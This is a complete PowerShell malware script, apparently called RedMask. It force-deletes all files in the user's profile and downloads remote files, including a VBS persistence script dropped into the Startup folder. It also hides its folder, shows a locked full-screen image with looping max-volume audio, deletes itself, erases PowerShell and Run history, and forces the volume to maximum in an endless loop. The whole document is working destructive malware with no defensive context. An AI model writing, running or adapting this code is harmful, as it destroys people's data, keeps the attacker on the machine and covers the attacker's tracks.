# Delete all user files except GUI files
Get-ChildItem -Path $env:USERPROFILE\* -Recurse -exclude $env:USERPROFILE\temp* |
Select -ExpandProperty FullName |
Where {$_ -notlike '$env:USERPROFILE\temp\*'} |
sort length -Descending |
Remove-Item -r -force 

# Download necessary files to super hidden folder
mkdir $env:USERPROFILE\temp
Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/wallpaper.jpg" -outfile "$env:USERPROFILE\temp\w.jpg"
Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/form.png" -outfile "$env:USERPROFILE\temp\f.png"
Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/sound.wav" -outfile "$env:USERPROFILE\temp\s.wav"
Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/Stamp.png" -outfile "$env:USERPROFILE\Desktop\YOU_ARE_NEXT.png"
Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/GUI_persistence.vbs" -outfile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UXControl.vbs"
attrib +s +h "$env:USERPROFILE\temp";

# Change wallpaper
Set-ItemProperty 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\w.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden;};

# Define max volume
Function Set-SpeakerVolume

{ Param (
  [switch]$min,
  [switch]$max)
  $wshShell = new-object -com wscript.shell
  If ($min)
  {1..50 | % {$wshShell.SendKeys([char]174)}}
  ElseIf ($max)
  {1..50 | % {$wshShell.SendKeys([char]175)}}
  Else
  {$wshShell.SendKeys([char]173)} }

# Show fullscreen image
Add-Type -AssemblyName system.windows.Forms
$user = $env:USERNAME
$computer = $env:COMPUTERNAME
$Form = New-Object system.windows.forms.form
$form.TopMost = $true
$Image = [system.drawing.image]::FromFile("$env:USERPROFILE\temp\f.png")
$Form.BackgroundImage = $Image
$Form.BackgroundImageLayout = "Zoom"
$Form.ShowInTaskbar = $false;
$Form.BackColor = "#000000"
$Form.WindowState = 'Maximized'
$Form.MinimizeBox = $False
$Form.ControlBox = $False
$Form.ShowInTaskbar = $False
$Form.FormBorderStyle = 'None'
$Form.MaximizeBox = $False
$Form.Show();

# Play audio at max volume
Set-SpeakerVolume -Max
$player = New-Object System.Media.SoundPlayer "$env:USERPROFILE\temp\s.wav"
$player.PlayLooping();


# Remove script
Remove-Item -Path $MyInvocation.MyCommand.Source

# Remove Powershell history
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue;
$pshist = Get-PSReadlineOption | select -expand historysavepath; rm $pshist;

#Spamming volume up button
WHILE ($TRUE) {
	Set-SpeakerVolume -Max
};
